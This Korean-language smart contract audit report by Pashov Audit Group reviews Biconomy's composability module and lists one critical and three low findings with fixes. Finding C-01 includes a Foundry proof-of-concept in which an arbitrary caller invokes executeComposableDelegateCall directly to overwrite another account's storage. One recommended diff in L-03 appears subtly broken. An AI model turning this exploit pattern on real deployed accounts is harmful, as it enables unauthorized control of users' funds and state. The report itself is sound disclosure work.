# 소개

**Pashov Audit Group**은 업계 최고의 스마트 계약 보안 연구원들로 구성된 여러 팀으로 이루어져 있습니다. 총 1000개 이상의 보안 취약점을 보고한 이 그룹은 절대적으로 최고의 감사 경험을 제공하기 위해 노력합니다. 100% 보안을 보장할 수는 없지만, 귀하의 블록체인 프로토콜을 위해 경험 많은 연구원들의 최선의 노력을 보장합니다. 이전 작업은 [여기](https://github.com/pashov/audits)에서 확인하거나 Twitter [@pashovkrum](https://twitter.com/pashovkrum)으로 연락주십시오.

# 면책 조항

스마트 계약 보안 검토는 취약점의 완전한 부재를 절대 확인할 수 없습니다. 이는 시간, 자원 및 전문 지식이 제한된 노력으로 가능한 한 많은 취약점을 찾으려고 시도하는 것입니다. 검토 후 100% 보안을 보장할 수 없으며, 검토가 스마트 계약의 문제를 발견할 것이라고 보장할 수도 없습니다. 후속 보안 검토, 버그 바운티 프로그램 및 온체인 모니터링을 강력히 권장합니다.

# 소개

**bcnmy/composability** 저장소에 대한 시간 제한 보안 검토가 **Pashov Audit Group**에 의해 수행되었으며, 애플리케이션의 스마트 계약 구현의 보안 측면에 중점을 두었습니다.

# Composability 소개

Biconomy Composability는 개발자가 온체인 개발 없이 프론트엔드 코드에서 직접 동적 다단계 트랜잭션을 구축할 수 있도록 지원하는 모듈식 스마트 계약 프레임워크로, 연쇄 작업, 유형 안전 입력, 반환 값 처리 및 제약 조건 검증과 같은 기능을 지원합니다.

# 위험 분류

| 심각도 | 영향: 높음 | 영향: 중간 | 영향: 낮음 |
| --- | --- | --- | --- |
| **가능성: 높음** | 치명적 | 높음 | 중간 |
| **가능성: 중간** | 높음 | 중간 | 낮음 |
| **가능성: 낮음** | 중간 | 낮음 | 낮음 |

## 영향

- 높음 - 프로토콜의 자산에 중대한 물질적 손실을 초래하거나 사용자 그룹에 심각한 해를 끼칩니다.
- 중간 - 프로토콜의 자산에 중간 정도의 물질적 손실을 초래하거나 사용자 그룹에 어느 정도 해를 끼칩니다.
- 낮음 - 프로토콜의 자산에 경미한 물질적 손실을 초래하거나 소규모 사용자 그룹에 해를 끼칩니다.

## 가능성

- 높음 - 온체인 조건을 모방한 합리적인 가정 하에 공격 경로가 가능하며, 훔치거나 손실될 수 있는 자금의 양에 비해 공격 비용이 상대적으로 낮습니다.
- 중간 - 조건부로 인센티브가 주어지는 공격 벡터이지만 여전히 상대적으로 가능성이 높습니다.
- 낮음 - 가정이 너무 많거나 너무 가능성이 낮거나 공격자가 인센티브가 거의 없거나 전혀 없는 상태에서 상당한 지분을 필요로 합니다.

## 심각도 수준에 따른 조치

- 치명적 - 가능한 한 빨리 수정해야 함 (이미 배포된 경우)
- 높음 - 수정해야 함 (아직 배포되지 않은 경우 배포 전)
- 중간 - 수정해야 함
- 낮음 - 수정할 수 있음

# 보안 평가 요약

_검토 커밋 해시_ - [deb743de17369d02cd07888250291e56efcf77aa](https://github.com/bcnmy/composability/tree/deb743de17369d02cd07888250291e56efcf77aa)

_수정 검토 커밋 해시_ - [c42ded55cf153ada71c4ab50edd7a963af79b8a6](https://github.com/bcnmy/composability/tree/c42ded55cf153ada71c4ab50edd7a963af79b8a6)

### 범위

다음 스마트 계약이 감사 범위에 포함되었습니다.

- `ComposableExecutionBase` 
- `ComposableExecutionLib` 
- `ComposableExecutionModule` 
- `ComposabilityDataTypes` 
- `Storage` 
- `Constants` 

# 발견 사항

# [C-01] DelegateCall 확인 누락

## 심각도

**영향:** 높음

**가능성:** 높음

## 설명

`executeComposableDelegateCall`은 `ComposableExecutionModule`이 설치된 계정이 `execute`를 `CALLTYPE_DELEGATECALL`과 함께 사용하여 이 기능을 사용할 수 있도록 하는 함수입니다.

```solidity
    /// @notice It doesn't require access control as it is expected to be called by the account itself via .execute(mode = delegatecall)
    function executeComposableDelegateCall(ComposableExecution[] calldata executions) external {
        _executeComposable(executions, address(this), _executeExecutionDelegatecall);
    }
```

```solidity
    function _executeExecutionDelegatecall(ComposableExecution calldata execution, bytes memory composedCalldata) internal returns (bytes[] memory returnData) {
        returnData = new bytes[](1);
        returnData[0] = _execute(execution.to, execution.value, composedCalldata);
    }
```

```solidity

    function _execute(address target, uint256 value, bytes memory callData) internal virtual returns (bytes memory result) {
        /// @solidity memory-safe-assembly
        assembly {
            result := mload(0x40)
            if iszero(call(gas(), target, value, add(callData, 0x20), mload(callData), codesize(), 0x00)) {
                // Bubble up the revert if the call reverts.
                returndatacopy(result, 0x00, returndatasize())
                revert(result, returndatasize())
            }
            mstore(result, returndatasize()) // Store the length.
            let o := add(result, 0x20)
            returndatacopy(o, 0x00, returndatasize()) // Copy the returndata.
            mstore(0x40, add(o, returndatasize())) // Allocate the memory.
        } 
    }
```

그러나 이 함수는 delegate call을 통해 호출되는지 확인하지 않습니다. 공격자는 `ComposableExecutionModule`이 설치된 대상 스마트 계정에 `executeFromExecutor` 요청을 생성하고 모듈에서 `executeComposableDelegateCall`을 호출하여 공격자가 스마트 계정에서 제한 없는 작업을 수행하도록 허용할 수 있습니다.

또 다른 시나리오는 공격자가 실행 내에서 직접 `writeStorage`를 수행하여 `Storage` 데이터를 조작할 수 있는 경우입니다.

PoC : 

```solidity
    function test_change_storage_data() public {
        address alice = address(0xabcd);
        // via composability module
        _inputStaticCallOutputExecResult(address(mockAccountFallback), address(composabilityHandler));

        // previous slot b value
        bytes32 namespace = storageContract.getNamespace(address(mockAccountFallback), address(composabilityHandler));
        bytes32 SLOT_B_0 = keccak256(abi.encodePacked(SLOT_B, uint256(0)));
        bytes32 storedValueB = storageContract.readStorage(namespace, SLOT_B_0);
        console.logString("previous slot B value : ");
        console.logUint(uint256(storedValueB));
        // 1. call directly executeComposableDelegateCall, provide storage as target and construct write storage operation
        InputParam[] memory inputParamsCall = new InputParam[](1);
        inputParamsCall[0] = InputParam({
            fetcherType: InputParamFetcherType.RAW_BYTES,
            paramData: abi.encode(SLOT_B_0, 420, address(mockAccountFallback)),
            constraints: emptyConstraints
        });

        OutputParam[] memory outputParamsCall = new OutputParam[](0);

        ComposableExecution[] memory executions = new ComposableExecution[](1);
        executions[0] = ComposableExecution({
            to: address(storageContract),
            value: 0, // no value sent
            functionSig: storageContract.writeStorage.selector,
            inputParams: inputParamsCall, // no input parameters needed
            outputParams: outputParamsCall // store output of the function A() to the storage
        });

        vm.startPrank(alice);

          // Call function composability directly
        ComposableExecutionModule(address(composabilityHandler)).executeComposableDelegateCall(executions);

        vm.stopPrank();

        bytes32 storedValueBNew = storageContract.readStorage(namespace, SLOT_B_0);
        console.logString("new slot B value : ");
        console.logUint(uint256(storedValueBNew));
    }
```

테스트 실행 : 

```
forge test --match-test test_change_storage_data -vvv
```

## 권장 사항

`executeComposableDelegateCall`을 제한하고 항상 delegate call 작업을 사용하여 수행되는지 확인하십시오.

```diff
    function executeComposableDelegateCall(ComposableExecution[] calldata executions) external {
+         require(THIS_ADDRESS != address(this), NotAllowed());
        _executeComposable(executions, address(this), _executeExecutionDelegatecall);
    }
```

# [L-01] 모든 EVM 네트워크에서 Push0 opcode 지원되지 않음

이 프로젝트는 solc 0.8.27 및 Cancun EVM 버전을 사용합니다. [Linea](https://docs.linea.build/get-started/build/ethereum-differences)와 같이 PUSH0 opcode를 지원하지 않는 EVM 네트워크의 경우 계약이 예상대로 작동하지 않을 수 있습니다.

프로젝트는 가능한 한 많은 EVM 네트워크와 호환되는 것을 목표로 하므로 대상 네트워크가 PUSH0 opcode를 지원하는지 확인하고, 그렇지 않은 경우 `foundry.toml` 구성 파일에서 EVM 버전을 Paris로 변경하는 것이 좋습니다.

# [L-02] 일부 네트워크는 하드코딩된 진입점 주소를 지원하지 않음

`ComposableExecutionModule`은 v0.7 진입점의 하드코딩된 주소를 사용하여 트랜잭션의 발신자를 확인합니다. 그러나 지원될 것으로 예상되는 모든 네트워크가 표준 EntryPoint v0.7을 사용하는 것은 아닙니다. 예를 들어 [VeChain](https://docs.vechain.org/core-concepts/account-abstraction/entrypoint-contract)의 경우가 그렇습니다.

스마트 계정은 `onInstall()` 및 `setEntryPoint()` 함수로 특정 진입점을 설정할 수 있지만, 배포 시 네트워크의 진입점을 설정할 수 있도록 하여 피할 수 있는 추가 단계입니다.

배포 시 진입점을 설정할 수 있도록 다음 변경 사항이 제안됩니다.

```diff
-   address public constant ENTRY_POINT_V07_ADDRESS = 0x0000000071727De22E5E9d8BAf0edAc6f37da032;
+   address private constant ENTRY_POINT_V07_ADDRESS = 0x0000000071727De22E5E9d8BAf0edAc6f37da032;
    address private immutable THIS_ADDRESS;
+   address public immutable ENTRY_POINT_ADDRESS;
(...)
-   constructor() {
+   constructor(address entryPoint) {
+       if (entryPoint == address(0)) {
+           ENTRY_POINT_ADDRESS = ENTRY_POINT_V07_ADDRESS;
+       } else {
+           ENTRY_POINT_ADDRESS = entryPoint;
+       }
        THIS_ADDRESS = address(this);
    }
(...)
-       require(sender == ENTRY_POINT_V07_ADDRESS || 
+		require(sender == ENTRY_POINT_ADDRESS || 
                sender == entryPoints[msg.sender] || 
                sender == msg.sender, OnlyEntryPointOrAccount());
(...)
    function getEntryPoint(address account) external view returns (address) {
-       return entryPoints[account] == address(0) ? ENTRY_POINT_V07_ADDRESS : entryPoints[account];
+       return entryPoints[account] == address(0) ? ENTRY_POINT_ADDRESS : entryPoints[account];
    }
```

# [L-03] Composable delegate call이 스토리지 레이아웃 가정을 깨뜨릴 수 있음

Delegate call을 통해 호출될 것으로 예상되는 `executeComposableDelegateCall` 내부에서 `Storage.writeStorage`의 호출자는 `ComposableExecutionModule`이 아니라 스마트 계정 자체입니다.

```solidity
    function _parseReturnDataAndWriteToStorage(uint256 returnValues, bytes memory returnData, address targetStorageContract, bytes32 targetStorageSlot, address account) internal {
        for (uint256 i; i < returnValues; i++) {
            bytes32 value;
            assembly {
                value := mload(add(returnData, add(0x20, mul(i, 0x20))))
            }
            Storage(targetStorageContract).writeStorage({
                slot: keccak256(abi.encodePacked(targetStorageSlot, i)),
                value: value,
                account: account
            });
        }
    }
```

이것은 `targetStorageSlot`뿐만 아니라 `writeStorage` 작업의 호출자에게도 의존하기 때문에 `StorageContract`에서 스토리지가 관리되는 방식에 영향을 미칩니다.

```solidity
    function writeStorage(bytes32 slot, bytes32 value, address account) external {
>>>     bytes32 namespace = getNamespace(account, msg.sender);
        _writeStorage(slot, value, namespace);
    }
```

이것은 `Storage`의 읽기/쓰기 작업에 사용되는 슬롯에 대한 가정을 깨뜨릴 수 있습니다. `executeComposable` 및 `executeComposableDelegateCall`에서 동일한 `targetStorageSlot` 및 `StorageContract`를 제공하면 스토리지 계약에서 다른 네임스페이스 슬롯이 사용됩니다.

권장 사항

`ComposableExecutionModule` 내부에 출력을 처리하기 위한 별도의 함수를 생성합니다. 이 함수는 `executeComposableDelegateCall` 끝에서 호출되어 출력을 처리하고 안전하게 저장합니다.

```diff
    function executeComposableDelegateCall(ComposableExecution[] calldata executions) external {
-        _executeComposable(executions, address(this), _executeExecutionDelegatecall);
+        _executeComposableDelegatecall(executions, address(this), _executeExecutionDelegatecall);
    }
```

```diff
+    function _executeComposableDelegatecall(
+       ComposableExecution[] calldata executions,
+        address account,
+        function(ComposableExecution calldata execution, bytes memory composedCalldata) internal returns(bytes[] memory) +executeExecutionFunction
+    ) internal {
+        // we can not use erc-7579 batch mode here because we may need to compose
+        // the next call in the batch based on the execution result of the previous call
+        uint256 length = executions.length;
+        for (uint256 i; i < length; i++) {
+            ComposableExecution calldata execution = executions[i];
+            bytes memory composedCalldata = execution.inputParams.processInputs(execution.functionSig);
+            bytes[] memory returnData; 
+            if (execution.to != address(0)) {
+                returnData = executeExecutionFunction(execution, composedCalldata);
+            } else {
+                returnData = new bytes[](1);
+                returnData[0] = "";
+            }
+            THIS_ADDRESS.processOutputs(execution.outputParams, returnData[0], account);
+        }
+    }
```

```diff
+    function processOutputs(OutputParam[] calldata outputParams, bytes memory returnData, address account) public {
+        require(account == msg.sender, "Not allowed");
+        outputParams.processOutputs(returnData[0], account);
+    }
```

